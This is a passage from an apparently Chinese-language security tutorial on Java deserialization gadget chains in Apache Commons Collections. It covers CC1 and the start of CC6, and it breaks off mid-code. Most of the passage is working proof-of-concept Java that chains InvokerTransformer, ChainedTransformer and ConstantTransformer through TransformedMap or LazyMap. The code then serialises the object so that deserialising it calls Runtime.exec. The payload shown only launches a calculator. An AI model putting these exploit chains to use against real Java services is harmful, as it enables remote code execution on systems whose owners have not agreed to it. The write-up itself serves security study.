class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">//InvokerTransformer反射获取Runtime的getRuntime方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">runmethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;).transform(Runtime.class);</span><br><span class="line">        <span class="comment">//InvokerTransformer反射 执行获取到的getRuntime方法, 返回一个runtime对象</span></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(runmethod);</span><br><span class="line">        <span class="comment">//反射获取Runtime下的exec方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">execmethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;&#125;).transform(Runtime.class);</span><br><span class="line">        </span><br><span class="line">        execmethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321194633809.png" alt="image-20240321194633809"></p><p>这里虽然成功了, 但是紧接着就出现了另一个问题, 在一开始我们只向TransformedMap.decorate中传入了一个我们精心构造的invokerTransformer对象, 而现在变成了这样一串代码, 也就是从一次transform的调用变成了多次transform的调用</p><p>这里移步至ChainedTransformer这个类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321200533277.png" alt="image-20240321200533277"></p><p>这里的transform进行了对iTransformers[i]的递归调用, 正好就是我们反射代码中的过程, 我们只需要将iTransformers[i]赋值为invokerTransformer即可,这样就通过同名函数调用到我们需要的那个transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure><p>与之前的代码拼接, 构造一个transformedmap, 利用AnnotationInvocationHandler中readObject中的setValue去调用transformedmap中的checkSetValue</p><p>完整代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Override.class, transformedmap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>加入序列化与反序列化接口来触发readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Override.class, transformedmap);<span class="comment">//////////////传入注解类和transformedmap</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里调试一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321210044455.png" alt="image-20240321210044455"></p><p>发现没有进去if</p><p>首先我们需要memberType !&#x3D; null</p><p>不难发现memberValue就是传入的map(有一个键值对”bbb”,”aaa”), 在这里获取了它的键, 并将memberTypes下此键的值赋给memberType </p><p>memberType 由 memberTypes设置, memberTypes由annotationType.memberTypes()设置, 跟进annotationType</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321211135555.png" alt="image-20240321211135555"></p><p>可以看见,调试器已经标记出来了, 这里的type就是我们传入的注解类</p><p>我们传入的注解类是Override, 但是Override中并没有bbb这个属性</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213340551.png" alt="image-20240321213340551"></p><p>因此考虑别的注解类</p><p>Target注解</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213414486.png" alt="image-20240321213414486"></p><p>可以看见Target有一个value属性, 因此我们可以将map键名改为value</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321213644208.png" alt="image-20240321213644208"></p><p>这样就直接进入到了两个if中</p><p>但是这里还有问题,会报错</p><p>这是因为 为了避免Runtime无法序列化的问题, 我们需要从Runtime.class开始 反射获取getRuntime方法, 再获取Runtime对象, 再获取exec方法</p><p>而我们是从一个递归调用可控对象的transform方法开始的, 我们能传入的只是对象的数组, 如何将把Runtime.class放在反射链的首部又变成了一个新的问题</p><p>这里又移步至ConstantTransformer这个类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321215356371.png" alt="image-20240321215356371"></p><p>一切都是这么的巧, 这个类下有一个transform方法, 它返回传入的参数, 我们只需要实例化它, 并构造函数传参为Runtime.class, 这要Runtime.class就会被返回回来, 成为反射链子的首部</p><p>之后Runtime.class会成为下一次transform的参数(object), 从而绕过AnnotationInvocationHandler下setValue中参数不可控的问题</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330114646344.png" alt="image-20240330114646344"></p><p>最终利用代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240321215644440.png" alt="image-20240321215644440"></p><p>成功执行!</p><h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>由于在java8u71大版本中AnnotationInvocationHandler.readObject被修改了，没有上述CC1的调用链,因此出现了CC6, 事实上CC6是CC1的变种, 它没有版本限制, 这里我们依旧沿用CC1的环境</p><h2 id="链子分析-1"><a href="#链子分析-1" class="headerlink" title="链子分析"></a>链子分析</h2><p>在此之前, 让我们先来回忆一下CC1的调用链</p><ol><li><p>首先 入口为AnnotationInvocationHandler的readObject, readObject下有一个setValue方法,此时setValue参数不可控</p></li><li><p>通过同名方法, 跳转到TransformedMap下的setValue方法(此方法继承自AbstractInputCheckedMapDecorator), 又调用TransformedMap下的CheckValue方法, CheckValue中调用了可控参数的transform方法</p></li><li><p>通过transform同名方法, 跳转到ChainedTransformer下的transform, 此方法递归调用了一个可控数组的transform方法,形成一个调用链, 通过将可控数组第一个元素赋值为ConstantTransformer, 调用ConstantTransformer的transform返回一个Runtime,Class作为下一次transform调用的参数, 绕过步骤1中etValue参数不可控的问题, 逐步通过InvokerTransformer调用链执行我们想要的行为</p></li></ol><p>这是我们上面分析出的CC1</p><p>再来看下ysoserial上的CC1链子</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240329211807221.png" alt="image-20240329211807221"></p><p>不同之处是ysoserial用的是LazyMap.get, 而我们使用的是TransformedMap.setValue()</p><p>再来看ysoserial上的CC6链子</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330121419699.png" alt="image-20240330121419699"></p><p>这里后半段链子实际上和ysoserial中的CC1的后半段高度相似, 不同的是CC1中调用LazyMap.get()的是AnnotationInvocationHandler, 而这里是TiedMapEntry</p><p>先来看LazyMap, 这里之前没有分析过</p><p>与TransformedMap类似, 它也有一个decorate方法来返回一个LazyMap对象, 并且使得get方法中的参数可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330201851832.png" alt="image-20240330201851832"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330201820196.png" alt="image-20240330201820196"></p><p>转到TiedMapEntry, 可以发现它调用了可控对象的get方法, 并且传给get的参数可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330190853630.png" alt="image-20240330190853630"></p><p>再看谁调用了getValue()             <em><strong>后续不需要考虑参数, 因为这里的getValue并没有接收任何参数</strong></em></p><p>往下翻就能看见就能发现, hashCode()调用了getValue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330191238122.png" alt="image-20240330191238122"></p><p>看见hashCode,就可以想到去HashMap集合中寻找其调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330192257619.png" alt="image-20240330192257619"></p><p>继续寻找谁调用了hash, 答案是put (这里选用put是ysoserial中的链子, 后面会更改)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330195711124.png" alt="image-20240330195711124"></p><p>之后是HashSet中的readObject调用了put</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330200217088.png" alt="image-20240330200217088"></p><p>以上是ysoserial中的调用链, 实际上我们并不需要去调用HashSet中的readObject, 在URLDNS链子中, 我们调用了hashMap中的readObject, 在readObject的最后调用了hash</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330224651396.png" alt="image-20240330224651396"></p><p>跟进, 调用hashCode</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330224957275.png" alt="image-20240330224957275"></p><p>之后就是构造调用到TiedMapEntry</p><p>需要注意的是, </p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240330232456683.png" alt="image-20240330232456683"></p><p>想要进入这个if, 需要使map中没有key, 这个key是TiedMapEntry的第二个参数传过来的, 我们传入了一个aaa, 因此我们必须在put后将它remove掉</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.remove(<span class="string">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> 